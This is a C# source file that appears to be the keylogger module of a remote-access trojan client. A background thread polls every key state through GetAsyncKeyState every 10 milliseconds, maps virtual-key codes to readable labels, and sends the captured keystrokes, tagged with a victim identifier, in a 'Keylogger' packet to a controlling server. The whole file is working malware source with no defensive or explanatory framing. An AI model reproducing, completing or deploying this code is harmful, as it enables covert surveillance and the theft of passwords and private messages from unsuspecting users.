using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Client.Connection;
using Client.Things;
using Stuff;

namespace Client.Handlers
{
    class HandleKeylogger
    {
        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(int vKey);
        private static HashSet<int> pressedKeys = new HashSet<int>();

        private static Dictionary<int, string> keyMap = new Dictionary<int, string>

{
    { 8, "[Back]" }, { 9, "[Tab]" }, { 13, "[Enter]" }, { 16, "[Shift]" }, { 17, "[Ctrl]" }, { 18, "[Alt]" },
    { 19, "[Pause]" }, { 20, "[CapsLock]" }, { 27, "[Esc]" }, { 32, "[Space]" },
    { 33, "[PageUp]" }, { 34, "[PageDown]" }, { 35, "[End]" }, { 36, "[Home]" },
    { 37, "[Left]" }, { 38, "[Up]" }, { 39, "[Right]" }, { 40, "[Down]" },
    { 44, "[PrintScreen]" }, { 45, "[Insert]" }, { 46, "[Delete]" },

    { 48, "0" }, { 49, "1" }, { 50, "2" }, { 51, "3" }, { 52, "4" }, { 53, "5" }, { 54, "6" }, { 55, "7" }, { 56, "8" }, { 57, "9" },
    { 65, "A" }, { 66, "B" }, { 67, "C" }, { 68, "D" }, { 69, "E" }, { 70, "F" }, { 71, "G" }, { 72, "H" }, { 73, "I" }, { 74, "J" },
    { 75, "K" }, { 76, "L" }, { 77, "M" }, { 78, "N" }, { 79, "O" }, { 80, "P" }, { 81, "Q" }, { 82, "R" }, { 83, "S" }, { 84, "T" },
    { 85, "U" }, { 86, "V" }, { 87, "W" }, { 88, "X" }, { 89, "Y" }, { 90, "Z" },

    { 91, "[LWin]" }, { 92, "[RWin]" }, { 93, "[Menu]" },

    { 96, "0" }, { 97, "1" }, { 98, "2" }, { 99, "3" }, { 100, "4" }, { 101, "5" }, { 102, "6" }, { 103, "7" }, { 104, "8" }, { 105, "9" },
    { 106, "*" }, { 107, "+" }, { 109, "-" }, { 110, "." }, { 111, "/" },

    { 112, "[F1]" }, { 113, "[F2]" }, { 114, "[F3]" }, { 115, "[F4]" }, { 116, "[F5]" },
    { 117, "[F6]" }, { 118, "[F7]" }, { 119, "[F8]" }, { 120, "[F9]" }, { 121, "[F10]" },
    { 122, "[F11]" }, { 123, "[F12]" }, { 124, "[F13]" }, { 125, "[F14]" }, { 126, "[F15]" }, { 127, "[F16]" },
    { 128, "[F17]" }, { 129, "[F18]" }, { 130, "[F19]" }, { 131, "[F20]" }, { 132, "[F21]" }, { 133, "[F22]" }, { 134, "[F23]" }, { 135, "[F24]" },

    { 144, "[NumLock]" }, { 145, "[ScrollLock]" },
    { 160, "[LShift]" }, { 161, "[RShift]" }, { 162, "[LCtrl]" }, { 163, "[RCtrl]" },
    { 164, "[LAlt]" }, { 165, "[RAlt]" },

    { 186, ";" }, { 187, "=" }, { 188, "," }, { 189, "-" }, { 190, "." }, { 191, "/" }, { 192, "`" },
    { 219, "[" }, { 220, "\\" }, { 221, "]" }, { 222, "'" },
    { 226, "\\" }
};


        public static void Start()
        {
            new Thread(() =>
            {
                StringBuilder log = new StringBuilder();
                while (true)
                {
                    for (int i = 1; i < 255; i++)
                    {
                        if (i == 1 || i == 2 || i == 4) continue; 

                        bool isPressed = (GetAsyncKeyState(i) & 0x8000) != 0;

                        if (isPressed && !pressedKeys.Contains(i))
                        {
                            pressedKeys.Add(i);
                            log.Append(verifyKey(i));
                        }
                        else if (!isPressed && pressedKeys.Contains(i))
                        {
                            pressedKeys.Remove(i);
                        }
                    }

                    if (log.Length > 0)
                    {
                        SendKeyLoggerData(log.ToString());
                        log.Clear();
                    }

                    Thread.Sleep(10);
                }
            })
            { IsBackground = true }.Start();
        }

        private static void SendKeyLoggerData(string keys)
        {
            Pack pack = new Pack();
            pack.Set("Packet", "Keylogger");
            pack.Set("UID", UID.Get());
            pack.Set("Keys", keys);
            SillyClient.Send(pack.Pacc());
        }

        private static string verifyKey(int code)
        {
            if (keyMap.TryGetValue(code, out string value)) return value;
            if (code >= 65 && code <= 90) return ((char)code).ToString().ToLower();
            if (code >= 48 && code <= 57) return ((char)code).ToString();
            return $"[{code}]";
        }
    }
}
